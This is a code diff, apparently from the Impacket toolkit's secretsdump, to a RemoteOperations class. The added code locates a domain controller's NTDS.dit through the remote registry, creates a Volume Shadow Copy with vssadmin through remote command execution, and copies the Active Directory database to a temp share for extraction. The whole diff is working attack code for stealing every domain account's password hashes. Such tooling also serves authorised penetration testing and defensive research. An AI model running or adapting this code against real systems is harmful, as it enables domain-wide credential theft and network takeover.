@@ -504,32 +504,53 @@ class RemoteOperations:
 
         lines = self.__answerTMP.split('\n')
         lastShadow = ''
+        lastShadowFor = ''
+
         # Let's find the last one
+        # The string used to search the shadow for drive. Wondering what happens
+        # in other languages
+        SHADOWFOR = 'Volume: ('
+
         for line in lines:
            if line.find('GLOBALROOT') > 0:
                lastShadow = line[line.find('\\\\?'):][:-1]
+           elif line.find(SHADOWFOR) > 0:
+               lastShadowFor = line[line.find(SHADOWFOR)+len(SHADOWFOR):][:2]
 
         self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')
 
-        return lastShadow
+        return lastShadow, lastShadowFor
 
     def saveNTDS(self):
         logging.info('Searching for NTDS.dit')
-        # First of all, see if NTDS is at the target server
-        tid = self.__smbConnection.connectTree('ADMIN$')
+        # First of all, let's try to read the target NTDS.dit registry entry
+        ans = rrp.hOpenLocalMachine(self.__rrp)
+        regHandle = ans['phKey']
         try:
-            fid = self.__smbConnection.openFile(tid, 'NTDS\\ntds.dit')
-        except Exception, e:
-            if str(e).find('NOT_FOUND') > 0:
-               return None
+            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters')
+            keyHandle = ans['phkResult']
+        except:
+            # Can't open the registry path, assuming no NTDS on the other end
+            return None
 
-        logging.info('NTDS.dit found. Calling vssadmin to get a copy. This might take some time')
+        try:
+            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DSA Database file')
+            ntdsLocation = dataValue[:-1]
+            ntdsDrive = ntdsLocation[:2]
+        except:
+            # Can't open the registry path, assuming no NTDS on the other end
+            return None
+
+        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
+        rrp.hBaseRegCloseKey(self.__rrp, regHandle)
+        
+        logging.info('Registry says NTDS.dit is at %s. Calling vssadmin to get a copy. This might take some time' % (ntdsLocation))
         # Get the list of remote shadows
-        shadow = self.__getLastVSS()
-        if shadow == '':
+        shadow, shadowFor = self.__getLastVSS()
+        if shadow == '' or (shadow != '' and shadowFor != ntdsDrive):
             # No shadow, create one
-            self.__executeRemote('%COMSPEC% /C vssadmin create shadow /For=%SYSTEMDRIVE%')
-            shadow = self.__getLastVSS()
+            self.__executeRemote('%%COMSPEC%% /C vssadmin create shadow /For=%s' % ntdsDrive)
+            shadow, shadowFor = self.__getLastVSS()
             shouldRemove = True
             if shadow == '':
                 raise Exception('Could not get a VSS')
@@ -539,10 +560,10 @@ class RemoteOperations:
         # Now copy the ntds.dit to the temp directory
         tmpFileName = ''.join([random.choice(string.letters) for i in range(8)]) + '.tmp'
 
-        self.__executeRemote('%%COMSPEC%% /C copy %s\\Windows\\NTDS\\ntds.dit %%SYSTEMROOT%%\\Temp\\%s' % (shadow, tmpFileName))
+        self.__executeRemote('%%COMSPEC%% /C copy %s%s %%SYSTEMROOT%%\\Temp\\%s' % (shadow, ntdsLocation[2:], tmpFileName))
       
         if shouldRemove is True:
-            self.__executeRemote('%COMSPEC% /C vssadmin delete shadows /For=%SYSTEMDRIVE% /Quiet')
+            self.__executeRemote('%%COMSPEC%% /C vssadmin delete shadows /For=%s /Quiet' % ntdsDrive)
 
         self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')
 
